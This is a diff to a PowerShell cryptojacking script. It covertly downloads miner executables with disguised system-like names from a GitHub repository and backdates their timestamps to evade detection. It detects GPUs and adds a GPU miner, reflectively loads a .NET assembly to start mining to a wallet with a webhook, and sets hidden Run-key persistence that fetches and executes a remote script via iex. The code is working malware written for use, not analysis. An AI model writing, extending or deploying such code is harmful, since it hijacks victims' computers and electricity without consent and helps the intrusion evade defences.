@@ -13,12 +13,12 @@ if (-not (Test-Path $StealthDir)) {
 }
 
 $CpuExe = Join-Path $StealthDir "win_sys_x.exe"
-$GpuExe = Join-Path $StealthDir "win_sys_g.exe"
+$GpuExe = Join-Path $StealthDir "win_sys_a.exe" # Using lolMiner for both AMD/NVIDIA (8MB)
 
 $wc = New-Object System.Net.WebClient
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 1. Handle CPU Miner (DIRECT DOWNLOAD + TIMESTOMP)
+# 1. Handle CPU Miner
 if (-not (Test-Path $CpuExe)) {
     try {
         $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
@@ -29,16 +29,24 @@ if (-not (Test-Path $CpuExe)) {
     } catch { }
 }
 
-# 2. Detect GPUs
-$NvidiaGpu = $null
-$AmdGpu = $null
+# 2. Detect and Download GPU Miner (lolMiner 8MB)
+$HasGpu = $null
 try {
     $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
     foreach ($vc in $vcs) {
-        if ($vc.Name -match "NVIDIA" -or $vc.PNPDeviceID -match "VEN_10DE") { $NvidiaGpu = $true }
-        if ($vc.Name -match "AMD" -or $vc.Name -match "Radeon" -or $vc.PNPDeviceID -match "VEN_1002") { $AmdGpu = $true }
+        if ($vc.Name -match "NVIDIA" -or $vc.Name -match "AMD" -or $vc.Name -match "Radeon") { $HasGpu = $true }
     }
 } catch { }
+
+if ($HasGpu -and -not (Test-Path $GpuExe)) {
+    try {
+        $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_a.exe"
+        $wc.DownloadFile($RawGpuUrl, $GpuExe)
+        $OldDate = Get-Date -Year 2020 -Month 11 -Day 05
+        (Get-Item $GpuExe).CreationTime = $OldDate
+        (Get-Item $GpuExe).LastWriteTime = $OldDate
+    } catch { }
+}
 
 # --- REFLECTIVE LOADING ---
 try {
@@ -46,13 +54,15 @@ try {
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
     $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
-    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
-    $IsAmd = if ($AmdGpu) { "true" } else { "false" }
+    
+    $GpuArg = if ($HasGpu) { $GpuExe } else { "" }
+    $IsAmd = "true" # lolMiner handles the flag internally, passing true is safe
+    
     $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
     $startMethod.Invoke($null, @([string]$combinedArgs))
 } catch { }
 
-# --- USER-MODE PERSISTENCE (NO ADMIN NEEDED) ---
+# --- USER-MODE PERSISTENCE ---
 try {
     $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $Payload = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
